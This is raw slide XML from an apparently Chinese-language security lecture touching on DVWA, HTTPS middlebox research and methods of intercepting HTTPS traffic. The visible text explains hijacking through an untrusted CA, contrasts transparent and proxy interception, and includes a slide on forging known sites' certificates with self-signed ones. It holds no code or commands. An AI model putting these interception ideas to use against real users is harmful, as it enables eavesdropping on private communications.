            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>DVWA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>一起学习</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="181836_Pjkp_3776619.pn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83786" y="1554163"/>
            <a:ext cx="6922453" cy="4663757"/>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a:xfrm>
            <a:off x="1149351" y="-46037"/>
            <a:ext cx="7793037" cy="958850"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Where to Learn More</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="441348" name="Picture 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="4162425"/>
            <a:ext cx="1749425" cy="2209800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="441349" name="Picture 5"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3657600" y="4162425"/>
            <a:ext cx="1838325" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="441350" name="Picture 6"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7493000" y="4162425"/>
            <a:ext cx="1574800" cy="2362200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="441351" name="Picture 7"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5594350" y="3500438"/>
            <a:ext cx="1797050" cy="2362200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="441352" name="Picture 8"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1752600" y="3573463"/>
            <a:ext cx="1836738" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="441353" name="Picture 9"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6" cstate="print"/>
          <a:srcRect r="17842" b="19760"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="344488" y="1052513"/>
            <a:ext cx="1903412" cy="2397125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="441354" name="Picture 10"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7" cstate="print"/>
          <a:srcRect l="4665" t="9453" r="3595" b="6647"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm rot="-21600000">
            <a:off x="6965950" y="1052513"/>
            <a:ext cx="1976438" cy="2376487"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="441355" name="Picture 11"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId8" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3200400" y="912813"/>
            <a:ext cx="2955925" cy="28035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1353"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="441353"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="8" presetID="3" presetClass="entr" presetSubtype="10" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="9" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="441354"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="10" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="441354"/>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441355"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="14" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="441355"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="15" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="1000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="16" presetID="12" presetClass="entr" presetSubtype="4" fill="hold" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="17" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="441352"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromBottom)">
                                      <p:cBhvr>
                                        <p:cTn id="18" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="441352"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="19" presetID="12" presetClass="entr" presetSubtype="4" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="20" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="441351"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromBottom)">
                                      <p:cBhvr>
                                        <p:cTn id="21" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="441351"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="22" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="1500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="23" presetID="12" presetClass="entr" presetSubtype="1" fill="hold" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="24" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="441348"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromTop)">
                                      <p:cBhvr>
                                        <p:cTn id="25" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="441348"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="26" presetID="12" presetClass="entr" presetSubtype="1" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="27" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="441349"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromTop)">
                                      <p:cBhvr>
                                        <p:cTn id="28" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="441349"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="29" presetID="12" presetClass="entr" presetSubtype="1" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="30" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="441350"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromTop)">
                                      <p:cBhvr>
                                        <p:cTn id="31" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="441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5481" y="3010393"/>
            <a:ext cx="8268493" cy="586685"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>三、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>安全问题（段海新等研究成果）</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982346" y="1957071"/>
            <a:ext cx="6742112" cy="3711892"/>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658813" y="1237297"/>
            <a:ext cx="7010400" cy="5267325"/>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658813" y="1554163"/>
            <a:ext cx="6962775" cy="4772025"/>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1150938" y="1554163"/>
            <a:ext cx="6800850" cy="4505325"/>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977265" y="1425892"/>
            <a:ext cx="6915150" cy="5133975"/>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968692" y="1554163"/>
            <a:ext cx="6657975" cy="493395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1150938" y="1554163"/>
            <a:ext cx="6724650" cy="4829175"/>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658813" y="1336357"/>
            <a:ext cx="6981825" cy="5038725"/>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1096963" y="1292542"/>
            <a:ext cx="6896100" cy="5095875"/>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1063625" y="1341120"/>
            <a:ext cx="6962775" cy="518160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1106488" y="1273492"/>
            <a:ext cx="6877050" cy="4981575"/>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888682" y="1431607"/>
            <a:ext cx="7000875" cy="5153025"/>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1082675" y="1377315"/>
            <a:ext cx="6924675" cy="5048250"/>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5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1111250" y="1341120"/>
            <a:ext cx="6867525" cy="502920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有了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，通信就不会被支持吗？</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977265" y="1347787"/>
            <a:ext cx="6915150" cy="4924425"/>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清华大学段海新教授团队关于中间盒子主要研究成果</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7" name="图片 6"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="890587" y="3096577"/>
            <a:ext cx="6753225" cy="2371725"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>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25315" y="1304781"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>段海新教授</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ACM CCS 2020</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245572" y="1904856"/>
            <a:ext cx="6591300" cy="1457325"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>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5616" y="1768070"/>
            <a:ext cx="2094806" cy="1611284"/>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556" y="3439160"/>
            <a:ext cx="6702274" cy="3138372"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="002060"/>
            </a:solidFill>
          </a:ln>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97853" y="1310323"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>清华大学段海新教授：</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pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="851535" y="2124075"/>
            <a:ext cx="6496050" cy="3829050"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>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进一步阅读“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTPS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>劫持漫谈：代理劫持与透明劫持”（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>https://mp.weixin.qq.com/s/lRdVqBKlR708tGGXQxjUWA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）了解</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>劫持原理</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>就安全了吗</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"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22135" y="2946224"/>
            <a:ext cx="6339549" cy="586685"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>四、监听</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>通信</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>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3052" y="1310323"/>
            <a:ext cx="8363268" cy="4678998"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>如何监听</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>通信？</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> HTTPS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>劫持的核心原理：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>不安全的 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CA </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>可以给任何网站进行签名</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>TLS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>服务器解密需要服务器私钥和公钥证书，然而这个不安全的 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>CA </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>可以提供用户暂时信任的服务器私钥和公钥证书</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>透明劫持</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Transparent HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）与</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>代理劫持</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Proxy HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>扩展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p:cTn id="7"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8"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1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="2">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_w*0.70"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="15" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="2">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4000" dirty="0"/>
              <a:t>用自签名证书伪造知名网站证书</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="4000"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50938" y="1880668"/>
            <a:ext cx="7153275" cy="3981450"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
